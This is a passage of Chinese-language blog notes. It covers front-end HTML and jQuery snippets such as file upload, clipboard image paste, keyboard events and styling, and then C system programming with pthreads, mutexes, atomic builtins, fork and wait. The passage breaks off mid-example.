<h3 id="5-4-结果实时更新"><a href="#5-4-结果实时更新" class="headerlink" title="5.4. 结果实时更新"></a>5.4. 结果实时更新</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">submitform</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;/uploadfile&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>($(<span class="string">&#x27;#myForm&#x27;</span>)[<span class="number">0</span>]),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">processData</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">contentType</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    $(<span class="string">&#x27;#output&#x27;</span>).<span class="title function_">text</span>(result);  <span class="comment">// 这里更新结果</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submitform();&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-input-输入框"><a href="#6-input-输入框" class="headerlink" title="6. input 输入框"></a>6. input 输入框</h2><h3 id="6-1-剪贴板图片粘贴上传"><a href="#6-1-剪贴板图片粘贴上传" class="headerlink" title="6.1. 剪贴板图片粘贴上传"></a>6.1. 剪贴板图片粘贴上传</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 监听input内的粘贴事件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fileInput&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;paste&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 判断剪贴板是否有内容</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!(e.<span class="property">clipboardData</span>) &amp;&amp; e.<span class="property">clipboardData</span>.<span class="property">items</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> data = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = e.<span class="property">clipboardData</span>.<span class="property">items</span>.<span class="property">length</span>; i &lt; len; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> item = e.<span class="property">clipboardData</span>.<span class="property">items</span>[i];</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 仅处理png图片类型</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (item.<span class="property">kind</span> === <span class="string">&quot;file&quot;</span> &amp;&amp; item.<span class="property">type</span> === <span class="string">&#x27;image/png&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 添加到formData中</span></span></span><br><span class="line"><span class="language-javascript">                    data.<span class="title function_">append</span>(<span class="string">&quot;file&quot;</span>, item.<span class="title function_">getAsFile</span>());</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!data.<span class="title function_">get</span>(<span class="string">&quot;file&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 上传</span></span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;/uploadfile&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                data,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">processData</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">contentType</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-2-禁止回车自动提交"><a href="#6-2-禁止回车自动提交" class="headerlink" title="6.2. 禁止回车自动提交"></a>6.2. 禁止回车自动提交</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;moduleName&quot;</span> <span class="attr">onkeydown</span>=<span class="string">&quot;if (event.keyCode == 13) &#123; return false; &#125;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-span标签"><a href="#7-span标签" class="headerlink" title="7. span标签"></a>7. span标签</h2><h3 id="7-1-显示换行"><a href="#7-1-显示换行" class="headerlink" title="7.1. 显示换行"></a>7.1. 显示换行</h3><ul>
<li>设置<code>white-space: pre;</code>就可以把换行符显示出来</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;white-space: pre;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="8-注释"><a href="#8-注释" class="headerlink" title="8. 注释"></a>8. 注释</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--我是行注释--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是代码<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--我是段注释</span></span><br><span class="line"><span class="comment">aaaasdf</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我还是代码<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-键盘事件"><a href="#9-键盘事件" class="headerlink" title="9. 键盘事件"></a>9. 键盘事件</h2><ul>
<li>可以用下面代码把所有键盘事件输出对应的keyCode</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (event.<span class="property">keyCode</span> != <span class="literal">undefined</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="title function_">alert</span>(event.<span class="property">keyCode</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="10-调整样式"><a href="#10-调整样式" class="headerlink" title="10. 调整样式"></a>10. 调整样式</h2><h3 id="10-1-内部调整"><a href="#10-1-内部调整" class="headerlink" title="10.1. 内部调整"></a>10.1. 内部调整</h3><ul>
<li>在内部使用<code>style=&quot;&quot;</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 50px;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;queryInterval&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="10-2-外部调整"><a href="#10-2-外部调整" class="headerlink" title="10.2. 外部调整"></a>10.2. 外部调整</h3><ul>
<li><code>.ant-row</code>选择<code>class=&quot;ant-row&quot;</code></li>
<li><code>#ant-row</code>选择<code>id=&quot;ant-row&quot;</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.ant-row</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="二、javascript"><a href="#二、javascript" class="headerlink" title="二、javascript"></a>二、javascript</h1><h2 id="1-更新标签属性"><a href="#1-更新标签属性" class="headerlink" title="1. 更新标签属性"></a>1. 更新标签属性</h2><h3 id="1-1-基本属性更新"><a href="#1-1-基本属性更新" class="headerlink" title="1.1. 基本属性更新"></a>1.1. 基本属性更新</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********** 隐藏 **********/</span></span><br><span class="line"><span class="comment">// id为mainTable的标签隐藏</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mainTable&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line"><span class="comment">// 显性</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mainTable&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 启用禁用 **********/</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submitButton&quot;</span>).<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 标签内的内容 ***********/</span></span><br><span class="line"><span class="comment">// id为errorShow的中间的内容</span></span><br><span class="line">$(<span class="string">&quot;#errorShow&quot;</span>).<span class="title function_">text</span>(<span class="string">`file upload failed, err <span class="subst">$&#123;response.msg&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>

<h1 id="三、工程相关"><a href="#三、工程相关" class="headerlink" title="三、工程相关"></a>三、工程相关</h1><h2 id="1-html模板"><a href="#1-html模板" class="headerlink" title="1. html模板"></a>1. html模板</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        hello world</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-浏览器不拉取最新代码"><a href="#1-浏览器不拉取最新代码" class="headerlink" title="1. 浏览器不拉取最新代码"></a>1. 浏览器不拉取最新代码</h2><p><code>Ctrl + F5</code>强制刷新，适用于chrome、edge</p>
<h2 id="2-访问https站点，其中的http请求被转成https"><a href="#2-访问https站点，其中的http请求被转成https" class="headerlink" title="2. 访问https站点，其中的http请求被转成https"></a>2. 访问https站点，其中的http请求被转成https</h2><ul>
<li>这个是chrome的安全设置，不允许在https页面访问http的请求，会自动提升为https</li>
<li>在火狐上没有这个限制</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统编程笔记（C语言）</title>
    <url>/blogs/2018-12-04-OSProgram/</url>
    <content><![CDATA[<p>操作系统课程设计总结出来的笔记，源码见: <a href="https://github.com/Githubwyb/operation_system_homework">https://github.com/Githubwyb/operation_system_homework</a></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>操作系统: Linux</li>
<li>编译器: make</li>
</ul>
<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><ul>
<li>创建函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 线程创建函数</span></span><br><span class="line"><span class="comment"> * @param tidp 线程标识符</span></span><br><span class="line"><span class="comment"> * @param attr 线程属性指针</span></span><br><span class="line"><span class="comment"> * @param start_rtn 线程执行函数(void *fun(void *))</span></span><br><span class="line"><span class="comment"> * @param arg 线程执行函数的参数</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *tidp,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">                    (<span class="type">void</span>*)(*start_rtn)(<span class="type">void</span>*),</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="type">void</span> *arg)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>等待线程结束</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 等待线程结束函数</span></span><br><span class="line"><span class="comment"> * @param thread 线程标识符</span></span><br><span class="line"><span class="comment"> * @param retval 获取线程结束返回值</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="type">void</span> **retval)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">threadHandler</span><span class="params">(<span class="type">void</span> *param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> threadID;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程</span></span><br><span class="line">    <span class="type">int</span> code = <span class="built_in">pthread_create</span>(&amp;threadID, <span class="literal">NULL</span>, threadHandler, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//等待线程结束</span></span><br><span class="line">    code = <span class="built_in">pthread_join</span>(threadID, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><ul>
<li>初始化和销毁</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 初始化锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁指针</span></span><br><span class="line"><span class="comment"> * @param attr 互斥锁属性，可以传NULL使用默认值</span></span><br><span class="line"><span class="comment"> * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_mutex_init</span><span class="params">(<span class="type">pthread_mutex_t</span> *restrict mutex, <span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *restrict attr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 销毁互斥锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁指针</span></span><br><span class="line"><span class="comment"> * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_mutex_destroy</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>上锁函数，被占用将阻塞线程</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 申请锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>解锁函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 解锁</span></span><br><span class="line"><span class="comment"> * @param mutex 线程互斥锁</span></span><br><span class="line"><span class="comment"> * @return 0，创建成功；其他，错误码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="comment">//线程执行函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">threadHandler</span><span class="params">(<span class="type">void</span> *param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//申请锁</span></span><br><span class="line">        <span class="built_in">pthread_mutex_lock</span>(&amp;mutex);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//释放锁</span></span><br><span class="line">        <span class="built_in">pthread_mutex_unlock</span>(&amp;mutex);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原子操作（GCC）"><a href="#原子操作（GCC）" class="headerlink" title="原子操作（GCC）"></a>原子操作（GCC）</h2><p>同一个进程中，原子操作是不可被线程间抢占的。一个线程中的原子操作可以实现同步，加快线程间的协调作用，进行无锁化编程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">type __sync_fetch_and_add (type *ptr, type value);  <span class="comment">//获取值后加上value</span></span><br><span class="line">type __sync_fetch_and_sub (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_or (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_and (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_xor (type *ptr, type value);</span><br><span class="line">type __sync_fetch_and_nand (type *ptr, type value);</span><br><span class="line">type __sync_add_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_sub_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_or_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_and_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_xor_and_fetch (type *ptr, type value);</span><br><span class="line">type __sync_nand_and_fetch (type *ptr, type value);</span><br></pre></td></tr></table></figure>

<h2 id="线程相关知识"><a href="#线程相关知识" class="headerlink" title="线程相关知识"></a>线程相关知识</h2><ul>
<li>线程内部创建变量是不共享的</li>
<li>全局变量线程内部共享</li>
</ul>
<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><ul>
<li>创建函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 创建一个进程</span></span><br><span class="line"><span class="comment"> * @return pid_t实质是int，包含在&lt;sys/types.h&gt;中，子进程返回0；父进程返回子进程号；-1为错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">fork</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>等待线程结束</li>
</ul>
<p>当有子进程结束或僵尸进程时，立刻返回第一个结束的子进程ID。如果有子进程在运行，阻塞父进程。如果没有子进程在运行，返回-1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 等待进程结束函数</span></span><br><span class="line"><span class="comment"> * @param status 获取进程程结束状态值</span></span><br><span class="line"><span class="comment"> * @return 第一个结束的子进程进程号；-1，没有子进程在运行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">wait</span><span class="params">(<span class="type">int</span> *status)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子进程的结束状态返回后存于status，底下有几个宏可判别结束情况</span></span><br><span class="line"><span class="built_in">WIFEXITED</span>(status);      <span class="comment">//如果子进程正常结束则为非0值。</span></span><br><span class="line"><span class="built_in">WEXITSTATUS</span>(status);    <span class="comment">//取得子进程exit()返回的结束代码，一般会先用WIFEXITED来判断是否正常结束才能使用此宏。</span></span><br><span class="line"><span class="built_in">WIFSIGNALED</span>(status);    <span class="comment">//如果子进程是因为信号而结束则此宏值为真</span></span><br><span class="line"><span class="built_in">WTERMSIG</span>(status);       <span class="comment">//取得子进程因信号而中止的信号代码，一般会先用WIFSIGNALED来判断后才使用此宏。</span></span><br><span class="line"><span class="built_in">WIFSTOPPED</span>(status);     <span class="comment">//如果子进程处于暂停执行情况则此宏值为真。一般只有使用WUNTRACED 时才会有此情况。</span></span><br><span class="line"><span class="built_in">WSTOPSIG</span>(status);       <span class="comment">//取得引发子进程暂停的信号代码，一般会先用WIFSTOPPED来判断后才使用此宏。</span></span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//创建进程</span></span><br><span class="line">    <span class="type">pid_t</span> processID = fork();</span><br><span class="line">    <span class="keyword">if</span> (processID == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//子进程执行代码</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (processID &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//父进程执行代码</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//等待子进程结束</span></span><br><span class="line">        <span class="type">int</span> 